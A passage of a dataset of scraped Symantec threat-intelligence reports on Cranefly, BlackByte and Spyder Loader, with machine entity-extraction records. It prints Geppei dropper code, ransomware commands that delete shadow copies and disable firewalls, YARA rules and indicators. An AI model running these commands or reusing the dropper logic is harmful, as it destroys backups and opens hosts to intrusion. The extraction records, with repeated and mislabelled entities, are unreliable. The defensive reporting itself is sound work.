Protection Bulletin. 072022b54085690001ff9ec546051b2f60564ffbf5b917ac1f5a0e3abe7254a5 0cc6285d4bfcb5de4ebe58a7eab9b8d25dfcfeb12676b0c084e8705e69f6f281 148145b9a2e3f3abdc6c2d3de340eabc82457be67fb44cfa400a5e7bd2f88760 2a4302e61015fdf5f65fbd456249bafe96455cd5cc8aefe075782365b9ae3076 3585a5cbbf1b8b3206d7280355194d5442ed997f61e061fd6938a93163c79507 37fe8efe828893042e4f1db7386d20fec55518a3587643f54d4c3ec82c35df6d 3c35514b27c57a46a5593dbbbfceddbc49979b20fddc14b68bf4f0ee965a7c59 3dd7b684024941d5ab26df6730d23087037535783e342ee98a3934cccddb8c3e 64c546439b6b2d930f5aced409844535cf13f5c6d24e0870ba9bc0cf354d8c11 79f9f25b15e88c47ce035f15dd88f18ecc11e1319ff6f88568fdd0d327ad7cc1 7fe67567a5de33166168357d663b85bd452d64a4340bdad29fe71588ad95bf6f 80a8a9a2e91ead0ae5884e823dca73ef9fce59ff96111c632902d6c04401a4fe 861d1307913d1c2dbf9c6db246f896c0238837c47e1e1132a44ece5498206ec2 8f7c74a9e1d04ff116e785f3234f80119d68ae0334fb6a5498f6d40eee189cf7 a462085549f9a1fdeff81ea8190a1f89351a83cf8f6d01ecb5f238541785d4b3 adb61560363fcda109ea077a6aaf66da530fcbbb5dbde9c5923a59385021a498 bcc99bc9c02e1e2068188e63bc1d7ebe308d0d12ce53632baa31ce992f06c34a b631abbfbbc38dac7c59f2b0dd55623b5caa1eaead2fa62dc7e4f01b30184308 c4a7a9ff4380f6b4730e3126fdaf450c624c0b7f5e9158063a92529fa133eaf2 e4a460db653c8df4223ec466a0237943be5de0da92b04a3bf76053fa1401b19e f7ea532becda13a1dcef37b4a7ca140c56796d1868867e82500e672a68d029e4 f969578a0e7fe90041d2275d59532f46dee63c6c193f723a13f4ded9d1525c6b fea2f48f4471af9014f92026f3c1b203825bb95590e2a0985a3b57d6b598c3ff The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Billbug, Attacker), (Thrip, Attacker), (Lotus Blossom, Attacker), (Hannotog, Malware), (Sagerunex, Malware), (certificate authority, Victim), (government agency, Victim), (defense agency, Victim), (Asian country, Target), (large number of machines, Target), (attackers, Target), (certificate authority, Target), (Asia, Target)\nRelationships: (Symantec, tracks, Billbug), (Symantec, tracks, Thrip), (Symantec, tracks, Lotus Blossom), (Symantec, tracks, Hannotog), (Symantec, tracks, Sagerunex), (Billbug, uses, Hannotog), (Billbug, uses, Sagerunex), (Billbug, targets, certificate authority), (Billbug, targets, government agency), (Billbug, targets, defense agency), (Billbug, targets, Asian country), (Billbug, targets, large number of machines), (Billbug, targets, certificate authority), (Billbug, targets, Asia), (Billbug, targets, large number of machines), (Billbug, targets, certificate authority), (Billbug, targets, Asian country), (Billbug, targets, large number of machines), (Billbug, targets, certificate authority), (Billbug, targets, Asian country), (",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Billbug",
          "Attacker"
        ],
        [
          "Thrip",
          "Attacker"
        ],
        [
          "Lotus Blossom",
          "Attacker"
        ],
        [
          "Hannotog",
          "Malware"
        ],
        [
          "Sagerunex",
          "Malware"
        ],
        [
          "certificate authority",
          "Victim"
        ],
        [
          "government agency",
          "Victim"
        ],
        [
          "defense agency",
          "Victim"
        ],
        [
          "Asian country",
          "Target"
        ],
        [
          "large number of machines",
          "Target"
        ],
        [
          "attackers",
          "Target"
        ],
        [
          "certificate authority",
          "Target"
        ],
        [
          "Asia",
          "Target"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "tracks",
          "Billbug"
        ],
        [
          "Symantec",
          "tracks",
          "Thrip"
        ],
        [
          "Symantec",
          "tracks",
          "Lotus Blossom"
        ],
        [
          "Symantec",
          "tracks",
          "Hannotog"
        ],
        [
          "Symantec",
          "tracks",
          "Sagerunex"
        ],
        [
          "Billbug",
          "uses",
          "Hannotog"
        ],
        [
          "Billbug",
          "uses",
          "Sagerunex"
        ],
        [
          "Billbug",
          "targets",
          "certificate authority"
        ],
        [
          "Billbug",
          "targets",
          "government agency"
        ],
        [
          "Billbug",
          "targets",
          "defense agency"
        ],
        [
          "Billbug",
          "targets",
          "Asian country"
        ],
        [
          "Billbug",
          "targets",
          "large number of machines"
        ],
        [
          "Billbug",
          "targets",
          "certificate authority"
        ],
        [
          "Billbug",
          "targets",
          "Asia"
        ],
        [
          "Billbug",
          "targets",
          "large number of machines"
        ],
        [
          "Billbug",
          "targets",
          "certificate authority"
        ],
        [
          "Billbug",
          "targets",
          "Asian country"
        ],
        [
          "Billbug",
          "targets",
          "large number of machines"
        ],
        [
          "Billbug",
          "targets",
          "certificate authority"
        ],
        [
          "Billbug",
          "targets",
          "Asian country"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 20
  },
  {
    "title": "cranefly new tools technique geppei danfuan",
    "link": "https://www.security.com/threat-intelligence/cranefly-new-tools-technique-geppei-danfuan",
    "content": "Update November 2, 2022:Updated with new information regarding the link to UNC3524. Symantec, byBroadcom Software, has discovered a previously undocumented dropper that is being used to install a new backdoor and other tools using the novel technique of reading commands from seemingly innocuous Internet Information Services (IIS) logs. The dropper (Trojan.Geppei) is being used by an actor Symantec calls Cranefly to install another piece of hitherto undocumented malware (Trojan.Danfuan) and other tools. The technique of reading commands from IIS logs is not something Symantec researchers have seen being used to date in real-world attacks. Initial analysis appeared to show a link between Cranefly activity and the activity of a group called UNC3524 thatMandiant published a blog about in May 2022. This link was primarily based on the use of the Regeorg webshell, however, as this is publicly available on Github, its use alone is not sufficient to establish a firm link. The first malicious activity Symantec researchers saw on victim machines was the presence of a previously undocumented dropper (Trojan.Geppei). It uses PyInstaller, which converts Python script to an executable file. Geppei reads commands from a legitimate IIS log. IIS logs are meant to record data from IIS, such as web pages and apps. The attackers can send commands to a compromised web server by disguising them as web access requests. IIS logs them as normal but Trojan.Geppei can read them as commands. The commands read by Geppei contain malicious encoded .ashx files. These files are saved to an arbitrary folder determined by the command parameter and they run as backdoors. The strings Wrde, Exco, and Cllo don't normally appear in IIS log files. These appear to be used for malicious HTTP request parsing by Geppei; the presence of these strings prompts the dropper to carry out activity on a machine. The attackers can use a dummy URL or even a non-existent URL to send these commands because IIS logs 404s in the same log file by default. flist = ['Wrde','Exco','Cllo','AppleWEBKit'] print('One Two Three') today = datetime.date.today() list1 = str(today).split('-') filename ='u_ex'+ list1[0][2:] + list1[1] + list1[2] +'.log' path ='C:/inetpub/logs/LogFiles/W3SVC1/'+ filename ifos.path.exists(path): shutil.copy(path,'C:\\\\windows\\\\temp\\\\IIS1.log') fp = open('C:\\\\windows\\\\temp\\\\IIS1.log','r') line = fp.readline()ifline != '': iflen(line.split('Wrde')) == 3: temp1 = line.split('Wrde') iflen(line.split('Exco')) == 3: temp2 = line.split('Exco') iflen(line.split('Cllo')) == 3: os.remove('C:\\\\windows\\\\temp\\\\IIS1.log') If the malicious HTTP request sample contains \"Wrde\" e.g.: The passed string to wrde() is decrypted by Decrpt(). The decrypted string is expected to look like the following: These are the malicious .ashx files, which are saved as: The backdoors that are dropped by this dropper include: When the malicious HTTP request sample contains \"Exco\", e.g.: The passed string to exco() is decrypted by Decrpt() and this decrypted string is an executable command by os.system(). If the malicious HTTP request contains \"Cllo\", function clear() is called. This function drops a hacking tool called sckspy.exe to disable eventlog logging for Service Control Manager. This appears to be another previously undocumented tool. It also appears that the clear() function attempts to remove lines that contain command or malicious .ashx file paths from the IIS log file; however, it does not inspect all lines so this function does not seem to work as intended. text4 ='[malicious base64 encoded exe file]' fw = open('c:\\\\windows\\\\temp\\\\DMI27F127.txt','w') os.system('certutil -decode c:\\\\windows\\\\temp\\\\DMI27F127.txt c:\\\\windows\\\\temp\\\\DMI27F127.cab') os.system('expand c:\\\\windows\\\\temp\\\\DMI27F127.cab c:\\\\windows\\\\system32\\\\sckspy.exe') os.system('c:\\\\windows\\\\system32\\\\sckspy.exe >c:\\\\windows\\\\temp\\\\DMI27F128.txt') fp = open('c:\\\\windows\\\\temp\\\\DMI27F128.txt','r') ifstr1.find('success') != -1: os.system('del c:\\\\windows\\\\temp\\\\DMI27F127.txt') os.system('del c:\\\\windows\\\\temp\\\\DMI27F127.cab') os.system('del c:\\\\windows\\\\system32\\\\sckspy.exe') os.system('del c:\\\\windows\\\\temp\\\\DMI27F128.txt') Dropped malicious .ashx files (i.e. Trojan.Danfuan and Hacktool.Regeorg) are removed in wrde() if it is called with option 'r': temp = info[2].replace('\\\\\\\\', '\\\\') os.system('del ' + temp) name = temp.split('\\\\') flist.remove(name[(-1)][:-1]) Hacktool.Regeorg has been used by multiple advanced persistent threat (APT) groups in the past, but as this code is publicly available on GitHub, its use does not offer sufficient clues for attribution. Symantec was unable to link this activity to any known groups. The use of a novel technique and custom tools, as well as the steps taken to hide traces of this activity on victim machines, indicate that Cranefly is a fairly skilled threat actor. While we do not see data being exfiltrated from victim machines, the tools deployed and efforts taken to conceal this activity indicate that the most likely motivation for this group is intelligence gathering. For the latest protection updates, please visit theSymantec Protection Bulletin. 12eaac1b8dc29ba29287e7e30c893017f82c6fadb73dbc8ef2fa6f5bd5d9d84e 981b28d7521c5b02f026cb1ba5289d61ae2c1bb31e8b256db21b5dcfb8837475 6dcfa79948cf90b10b05b59237cf46adb09b2ce53bc2c0d38fce875eccd3a7e1 0af8bf1fa14fe492de1cc870ac0e01fc8b2f6411de922712a206b905a10ee379 7d5018d823939a181a84e7449d1c50ac3eb94abf3585a2154693ef5180877b95 b5a4804cf7717fda1f01f23c1c2fe99fe9473b03f0247bcc6190f17d26856844 1975bea7ca167d84003b601f0dfb95c4b31a174ce5af0b19e563cb33cba22ffa 56243c851b13218d3031ca7e5af8f2b891e139cbd6d7e3f40508e857802a1077 0b8d024ec29619ff499e4b5024ff14451731a4e3155636a02ef5db2df0e0f0dd 0b168638224589937768eb15c9ebbe795d6539d1fbe744a8f065fedd569bfc5e The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (UNC3524, Attacker), (Trojan.Geppei, Malware), (Trojan.Danfuan, Malware), (Regeorg webshell, Tool), (PyInstaller, Tool), (IIS, Tool), (webpages, File), (apps, File)\nRelationships: (UNC3524, associatedWith, Cranefly), (Cranefly, uses, Trojan.Geppei), (Cranefly, uses, Trojan.Danfuan), (Trojan.Geppei, contains, IIS logs), (Trojan.Geppei, uses, PyInstaller), (Trojan.Geppei, reads, IIS logs), (Trojan.Geppei, executedBy, attacker), (Trojan.Geppei, linkedTo, UNC3524), (Trojan.Geppei, linkedTo, Regeorg webshell), (Trojan.Geppei, linkedTo, PyInstaller), (Trojan.Geppei, linkedTo, IIS logs), (Trojan.Geppei, linkedTo, webpages), (Trojan.Geppei, linkedTo, apps)",
      "entities": [
        [
          "UNC3524",
          "Attacker"
        ],
        [
          "Trojan.Geppei",
          "Malware"
        ],
        [
          "Trojan.Danfuan",
          "Malware"
        ],
        [
          "Regeorg webshell",
          "Tool"
        ],
        [
          "PyInstaller",
          "Tool"
        ],
        [
          "IIS",
          "Tool"
        ],
        [
          "webpages",
          "File"
        ],
        [
          "apps",
          "File"
        ]
      ],
      "relationships": [
        [
          "UNC3524",
          "associatedWith",
          "Cranefly"
        ],
        [
          "Cranefly",
          "uses",
          "Trojan.Geppei"
        ],
        [
          "Cranefly",
          "uses",
          "Trojan.Danfuan"
        ],
        [
          "Trojan.Geppei",
          "contains",
          "IIS logs"
        ],
        [
          "Trojan.Geppei",
          "uses",
          "PyInstaller"
        ],
        [
          "Trojan.Geppei",
          "reads",
          "IIS logs"
        ],
        [
          "Trojan.Geppei",
          "executedBy",
          "attacker"
        ],
        [
          "Trojan.Geppei",
          "linkedTo",
          "UNC3524"
        ],
        [
          "Trojan.Geppei",
          "linkedTo",
          "Regeorg webshell"
        ],
        [
          "Trojan.Geppei",
          "linkedTo",
          "PyInstaller"
        ],
        [
          "Trojan.Geppei",
          "linkedTo",
          "IIS logs"
        ],
        [
          "Trojan.Geppei",
          "linkedTo",
          "webpages"
        ],
        [
          "Trojan.Geppei",
          "linkedTo",
          "apps"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 13
  },
  {
    "title": "blackbyte exbyte ransomware",
    "link": "https://www.security.com/threat-intelligence/blackbyte-exbyte-ransomware",
    "content": "Symantec’s Threat Hunter Team has discovered that at least one affiliate of the BlackByte ransomware (Ransom.Blackbyte) operation has begun using a custom data exfiltration tool during their attacks. The malware (Infostealer.Exbyte) is designed to expedite the theft of data from the victim’s network and upload it to an external server. BlackByte is a ransomware-as-a-service operation that is run by a cyber-crime group Symantec calls Hecamede. The group sprang to public attention in February 2022 whenthe U.S. Federal Bureau of Investigation (FBI) issued an alertstating that BlackByte had been used to attack multiple entities in the U.S., including organizations in at least three critical infrastructure sectors. In recent months, BlackByte has become one of the most frequently used payloads in ransomware attacks. The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service. On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent APIs. It then checks for the running processes from the following applications: It then checks for the following anti-virus or sandbox-related files: This routine of checks is quite similar to the routine employed by the BlackByte payload itself,as documented recently by Sophos. Next, Exbyte enumerates all document files on the infected computer, such as .txt, .doc, and .pdf files, and saves the full path and file name to %APPDATA%\\dummy. The files listed are then uploaded to a folder the malware creates on Mega.co.nz. Credentials for the Mega account used are hardcoded into Exbyte. Exbyte is not the first custom-developed data exfiltration tool to be linked to a ransomware operation. In November 2021,Symantec discovered Exmatter, an exfiltration tool that was used by the BlackMatter ransomware operation andhas since been used in Noberus attacks. Other examples include the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware. In recent BlackByte attacks investigated by Symantec, the attackers exploited the ProxyShell (CVE-2021-34473,CVE-2021-34523, andCVE-2021-31207) and ProxyLogon (CVE-2021-26855andCVE-2021-27065) vulnerabilities in Microsoft Exchange Servers to gain initial access. Symantec has observed attackers using AdFind, AnyDesk, NetScan, and PowerView prior to deploying the ransomware payload. Recent attacks have used version 2.0 of the BlackByte payload. On execution, the ransomware payload itself appears to download and save debugging symbols from Microsoft. The command is executed directly from the ransomware: powershell -command \"(New-Object Net.WebClient).DownloadFile('http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb', 'CSIDL_SYSTEM_DRIVE\\systemdata\\ntkrnlmp.pdb')\" The ransomware then checks the version information of ntoskrnl.exe and then creates a service with the following details: binPath = C:\\systemdata\\generalate displayName = AAAAAAAAAAAAAA!!!!!!!!!!!!!!! BlackByte then proceeds with the removal of Kernel Notify Routines. The purpose of this is to attempt to bypass EDR products. This functionality in BlackBytehas already been documented by Sophosand it closely resembles the techniques leveraged inthe EDRSandblast tool. BlackByte uses VssAdmin to delete volume shadow copies and resize storage allocation: cmd.exe /c start vssadmin.exe Delete Shadows /All /Quiet vssadmin Resize ShadowStorage /For=K: /On=K: /MaxSize=401MB It then makes the following service modifications: sc create ODosTEmONa binPath= CSIDL_SYSTEM_DRIVE\\systemdata\\generalate type= kernel sc.exe config RemoteRegistry start= auto sc.exe config Dnscache start= auto sc.exe config SSDPSRV start= auto sc.exe config fdPHost start= auto sc.exe config upnphost start= auto The ransomware then modifies firewall settings to enable linked connections: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\" netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\" cmd.exe /c netsh advfirewall set allprofiles state off Finally, BlackByte injects itself into an instance of svchost.exe, conducts file encryption, and then deletes the ransomware binary on disk: cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del CSIDL_WINDOWS\\rdac.exe /F /Q CSIDL_SYSTEM\\svchost.exe -s 27262842 Following the departure of a number of major ransomware operations such as Conti and Sodinokibi, BlackByte has emerged as one of the ransomware actors to profit from this gap in the market. The fact that actors are now creating custom tools for use in BlackByte attacks suggests that it may be on the way to becoming one of the dominant ransomware threats. For the latest protection updates, please visit theSymantec Protection Bulletin. copyright = \"Symantec\" family = \"Alias:ExfilTool\" description = \"Detects exfil tool used by BlackByte ransomware\" $data_str1 = {41 B9 04 00 00 00 66 66 0F 1F 84 00 00 00 00 00 43 0F B6 84 02 A0 00 00 00 41 30 00 49 FF C0 49 83 E9 01 75 EB 49 83 EB 01 75 D5 40 B7 09 48 8D} $data_str2 = {32 10 05 AF 59 2E 0D 38 32 59 C0 99 E8 A5 87 CB} $data_str3 = \"@BCEFHJLNPRTVY\" ascii and filesize > 2MB and filesize < 3MB and (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) rule blackbyte_exfil_unpacked copyright = \"Symantec\" family = \"Alias:ExfilTool\" description = \"Detects unpacked exfil tool used by BlackByte ransomware\" $str2 = \").NewUpload\" $str3 = \").CreateDir\" $str4 = \".PreloginMsg\" $str5 = \".UploadCompleteMsg\" $str6 = \").UploadFile\" $str7 = {FF 20 47 6F 20 62 75 69 6C 64 69 6E 66 3A 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 75 6E 6B 6E 6F 77 6E 00 00 00 00 00 00 00 00} $c1 = {44 24 68 44 31 C2 88 50 10 0F B6 54 24 56 44 0F} $c2 = {FB 48 89 F7 4C 89 C6 E8 54 ED F6 FF 4C 8D 43 01} all of ($str*) and ($c1 or $c2) and filesize > 8MB  and (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 3fb160e1770fafeedff2d77841bf02108c25cca4cb6d77e3fbf759077f356b70 - Infostealer.Exbyte 0097b8722c8c0840e8c1a4dd579438344b3e6b4d630d17b0bbe9c55159f43142 - Infostealer.Exbyte aeb1b789395357e8cc8dbd313b95f624fc03e037984040cd7c1704775bfb4bd2 - Infostealer.Exbyte 477382529659c3452020170d8150820210ab8cbdc6417a0f0ac86a793cd0d9b4 - Ransom.Blackbyte 1df11bc19aa52b623bdf15380e3fded56d8eb6fb7b53a2240779864b1a6474ad - Ransom.Blackbyte 44a5e78fce5455579123af23665262b10165ac710a9f7538b764af76d7771550 - Ransom.Blackbyte eb24370166021f9243fd98c0be7b22ab8cbc22147c15ecef8e75746eb484bb1a - Ransom.Blackbyte f361bafcc00b1423d24a7ea205264f5a0b96011e4928d9a91c2abc9911b433a1 - Ransom.Blackbyte 20848d28414d4811b63b9645adb549eed0afbd6415d08b75b0a93fbf7cfbf21f - Ransom.Blackbyte 754ac79aca0cc1bcf46000ef6c4cbe8bebeb50dae60823a1e844647ac16b6867 - Ransom.Blackbyte f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e - AdFind 794a5621fda2106fcb94cbd91b6ab9567fb8383caa7f62febafcf701175f2b91 - AdFind batch script 572d88c419c6ae75aeb784ceab327d040cb589903d6285bbffa77338111af14b - NetScan efc2125e628b116eb0c097c699e473a47a280dfcd3e02cada41bdf6969600b41 - PowerView 4877ff7c3c2abd349646db1163814811e69b36374e289f5808cc794113ef55ae - AnyDesk hxxp://gfs270n392[.]userstorage.mega.co[.]nz/ul/PCfY6R3GKGjIEQK2tzWLODSlhG-h5NbxGHdNAToANCzjKK8Z6kdCiqshxM6ctHDKpLU09-YobgYybaQkCnpwnw/4718592 hxxp://gfs262n303[.]userstorage.mega.co[.]nz/ul/f_re9dP6f9G8GAJhd3p43aJnvHnw7rCHLumJV-MXDlaL2RaSQQrPH1BYStJHWy4JkPgJ13KczuiJoOl0iwjxDA/15204352 hxxp://gfs206n171[.]userstorage.mega.co[.]nz/ul/9Y39ts0Mp6xtige0-wHhmMG74YgASgG1UhZYfzl_fh8TN_TQo1gSa92TNe_HTBxvOTirA0yfouEE74-Y3Cy1Tw/81264640 hxxp://gfs206n108[.]userstorage.mega.co[.]nz/ul/aX72PSSxERHKJwLdWCCOmsJQRioP7N6kcAltRRTbAgwGtNzcsdYa_7HTb4ToVV_HcVPORXotYAF5WqFAsmAOKA/15204352 hxxp://gfs208n174.userstorage[.]mega.co.nz/ul/z6nR8uTohiga4QeILJsXcAWlt05Vhu2XiDlne_Qag-rgAmZkK2aZMvYrWC5FHRebBpMoxYZEEqSStHyvU6SnWQ/6815744 hxxp://gfs214n129.userstorage[.]mega.co.nz/ul/wVJUlrn9bMLekALaMZx_o5FeK-U1oG9q4CWqHGNslUnVY2-BgJcEUxIJX9O4fXEWkt-x80LeAr7Jz9gXTCwzDA/2752512 hxxp://gfs204n140.userstorage[.]mega.co.nz/ul/_Amu75VCTCu6BgIdFs8ZgHPyHqBFm5Cj8bV1xkM5QFt2T0x-9C_KlHQAQ3kX4bzj8jgmyK9-dlbmx9ef6Y9JDw/1966080 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (BlackByte, Threat Type), (Infostealer.Exbyte, Malware), (Exbyte, Tool), (Mega.co.nz, Domain), (IsDebuggerPresent, Technique), (CheckRemoteDebuggerPresent, Technique), (anti-virus, Vulnerability), (sandbox, Vulnerability)\nRelationships: (BlackByte, uses, Infostealer.Exbyte), (BlackByte, employs, IsDebuggerPresent), (BlackByte, employs, CheckRemoteDebuggerPresent), (Infostealer.Exbyte, contains, IsDebuggerPresent), (Infostealer.Exbyte, contains, CheckRemoteDebuggerPresent), (Exbyte, linkedTo, Mega.co.nz), (Exbyte, uses, IsDebuggerPresent), (Exbyte, uses, CheckRemoteDebuggerPresent)",
      "entities": [
        [
          "BlackByte",
          "Threat Type"
        ],
        [
          "Infostealer.Exbyte",
          "Malware"
        ],
        [
          "Exbyte",
          "Tool"
        ],
        [
          "Mega.co.nz",
          "Domain"
        ],
        [
          "IsDebuggerPresent",
          "Technique"
        ],
        [
          "CheckRemoteDebuggerPresent",
          "Technique"
        ],
        [
          "anti-virus",
          "Vulnerability"
        ],
        [
          "sandbox",
          "Vulnerability"
        ]
      ],
      "relationships": [
        [
          "BlackByte",
          "uses",
          "Infostealer.Exbyte"
        ],
        [
          "BlackByte",
          "employs",
          "IsDebuggerPresent"
        ],
        [
          "BlackByte",
          "employs",
          "CheckRemoteDebuggerPresent"
        ],
        [
          "Infostealer.Exbyte",
          "contains",
          "IsDebuggerPresent"
        ],
        [
          "Infostealer.Exbyte",
          "contains",
          "CheckRemoteDebuggerPresent"
        ],
        [
          "Exbyte",
          "linkedTo",
          "Mega.co.nz"
        ],
        [
          "Exbyte",
          "uses",
          "IsDebuggerPresent"
        ],
        [
          "Exbyte",
          "uses",
          "CheckRemoteDebuggerPresent"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 8
  },
  {
    "title": "spyder loader cuckoobees hong kong",
    "link": "https://www.security.com/threat-intelligence/spyder-loader-cuckoobees-hong-kong",
    "content": "Symantec has observed a likely continuation of the Operation CuckooBees activity, this time targeting organizations in Hong Kong. Operation CuckooBeeswas first documentedin May 2022 by researchers at Cybereason, who said the intelligence-gathering campaign had been operating under the radar since at least 2019, stealing intellectual property and other sensitive data from victims. In the attacks observed by Symantec, the attackers remained active on some networks for more than a year. We saw the Spyder Loader (Trojan.Spyload) malware deployed on victim networks, indicating this activity is likely part of that ongoing campaign. While we did not see the ultimate payload in this campaign, based on the previous activity seen alongside the Spyder Loader malware it seems likely the ultimate goal of this activity was intelligence collection. The Spyder Loader malware wasfirst discussed publicly in a March 2021 blog by SonicWall, with the researchers saying at the time that the malware was “being used for targeted attacks on information storage systems, collecting information about corrupted devices, executing mischievous payloads, coordinating script execution, and C&C server communication.” These initial findings were expanded on substantiallyin a detailed Cybereason investigation published in May 2022, which detailed a long-running campaign that the researchers dubbed Operation CuckooBees. They said that this campaign had been ongoing since at least 2019. The researchers said that the attackers exfiltrated hundreds of gigabytes of information and that they “targeted intellectual property developed by the victims, including sensitive documents, blueprints, diagrams, formulas, and manufacturing-related proprietary data.” They also stole data that could be leveraged for use in future cyber attacks — such as credentials, customer data, and information about network architecture. Among the tools used in that campaign was the Spyder Loader malware, which is what was also observed in the activity seen by Symantec researchers. The loader sample analyzed by Symantec researchers is compiled as a 64-bit PE DLL. It is a modified copy of sqlite3.dll, with the following malicious export added: The sqlite3_prepare_v4 export expects a string as its third argument. Reportedly, whenever an export is executed by rundll32.exe, the third argument of the called export should contain part of the process command-line. When this loader is executed, it extracts the file name from its third argument, and the referred file is expected to contain a sequence of records. Each record has the following structure: At minimum, the malware sample requires records storing blob_ids 1 and 2. The sample also checks for the optional blob_ids 3 and 4. For blob_ids 1 and 2, the content of encrypted_blob is encrypted using the AES algorithm in Ciphertext Feedback (CFB) mode with segment_size of 0x80 bits. The encryption key is based on the name of an affected computer per GetComputerNameW() API: And the initialization vector (IV) is derived from the corresponding record header: Then the sample creates FileMapping with the following parameters: Next, it populates the created FileMapping with: Then it checks the status of service IKEEXT and stops the service, if running. Next, it drops the decrypted content of blob_id 1 as the following file, before starting the service: This is apparently intended to execute the created wlbsctrl.dll file. It is likely that this file acts as a next-stage loader that executes the content of blob_id 2 from the created FileMapping. It is possible that the remaining optional blobs could then be used for follow-up stages and/or configuration data. However, as Symantec researchers did not observe these additional content blobs being executed, this is speculative. As previously mentioned, AES encryption is used where the sample uses the CryptoPP C++ library, but ChaCha20 algorithm encryption is also used to obfuscate one of the strings. The malware also cleans up created artifacts, overwriting the content of the dropped wlbsctrl.dll file before deleting it, for example. These steps are most likely taken in order to prevent the activity being analyzed. Debug strings also indicated that the source code location of the malware was the following: Similarities between this activity and the Spyder Loader activity described by Cybereason include: These various similarities led us to conclude that this sample was also a version of the Spyder Loader malware. We saw various variants of Spyder Loader on victim networks, all displaying largely the same functionality. We saw assorted other malware samples that carried out various other types of activity on victim networks, including a modified SQLite DLL with the malicious exportsqlite3_extension_init,which creates and starts a service named GeneralManintenanceWork for a file named data.dat. We also saw Mimikatz being executed on victim networks, as well as a Trojanized ZLib DLL that had multiple malicious exports, one of which appeared to be waiting for communication from a command-and-control (C&C) server, while the other would load a payload from the provided file name in the command-line. Another sample installs and runs the below component of winpcap as a service: Files with the namesnpf.sysandpacket.dllare then installed. While we do not see the final payload delivered in this campaign, the use of the Spyder Loader malware and crossover with the activity previously identified by SonicWall and Cybereason, combined with the victims seen in this recent activity, make it most likely that the motivation behind this activity is intelligence gathering. The fact that this campaign has been ongoing for several years, with different variants of the Spyder Loader malware deployed in that time, indicates that the actors behind this activity are persistent and focused adversaries, with the ability to carry out stealthy operations on victim networks over a long period of time. Companies that hold valuable intellectual property should ensure that they have taken all reasonable steps to keep their networks protected from this kind of activity. For the latest protection updates, please visit theSymantec Protection Bulletin. 00634e46b14ba42c12e35a367f1c7a616fb8e8754ebb2e24ae936377a3ee544a 033313b31fbea64a1a0a53b38c74236f7af2e49018faa2be6c036427c456ef6d 06ed28c4ae295dec0bd692cd7fcecb5fa9de644968d281f5e4bf48eb72bc4b63 091e3e806b6d66cf1eccbd57a787eec65df5f07ad88118c576b3ae06c08af744 0cdbde55b23b26efd5c4503473bd673e3e5a75eae375bae866b6541edb8fcc84 181a25cbcd050c1b42839a5d32df4f59055e27377e71eaa3eb9230a43667f075 228784cc7dad998f1f8b7395bf758827eff9b27762a7056d9e8832bb8a029aad 260d54c2fcf725a8b6d030c36ca26f65ba3d01f707fa0e841cac0166d06218c0 2879253c8c8dd3ee53525c81801d813594bb657ad4f7478ba4288112f0315c9e 2da683d54f12d83f0f111b5c57f7f78016cad5860b2604d38b2aba37ab3d5c55 3196e74004816227323d6864448361fb173b3c96cf3d1b0aa26dfcd259a61505 33aa5df5470ae59cd30c7ea4c2ad1e13901a8fd13ea6b4b5584d10ffdba31ee4 396e35b2a4f920182d3148c834cf70f00b6094600e51e030d6fc297cb0ca5c06 3b3df3ada05e521ec8ce2f0deaeb6fd4359a2de9cadb0dd51c0d9d7a835473a4 3d96132412d8587849aa5dfd35c968755b30a08b100ec42eb810ff1f042e9fd0 3e10500c3779e56d2daa05da920d014becf33597f5ccb67c069320c5c43d40d2 4164cfc533621e37c8ad910f29d4afa92d0180c1697b7970746243574029a1f1 417a65be8ef81cb36021dbe56b07bf5dd65b7355e61b7a94bc988aaa335b22da 4221362bba10aedbb2d09729567d090f543c5de8543ec55ca4a6516815202064 438dddd93333ccfce4499558c92b20341166a134a8451ffc60ebf6ec5e0890dc 48658c800b724197cb91cbfd064df060221bc72bd77301707cb30b2f7c2b81fb 4a9cd0c32d6992077d3140917928f1b931bb2bf28e88f0dd8e4c92cd5d9cbe00 4bc3a4e4d74b81acf19621da7c8304527fff954747ab3393b78e0758306b3fa6 4d8784b957d826acc00e5a87d7317bbaeb63c7f9f86a5f446a41a5a355de437e 4dfae8301a9284eea4e975476ceaa652d5d3c799879dec7c5c9e18bbc2930885 54bcd44d4606e0fdb1b7c2110684f429f9e234269d213ddb60c9665e7b8679c7 551794bd7c66fb064d81230161b25ed81a714aa9377f2a9a1af69626dc99d385 5bf03354d708d3c87e82a50d3f4c948fc8c6e8186537b0463edafd9546b51333 5cf6bca323851a509120399a975edc759a9d2c5c21aff18ee6cae506b0f93d67 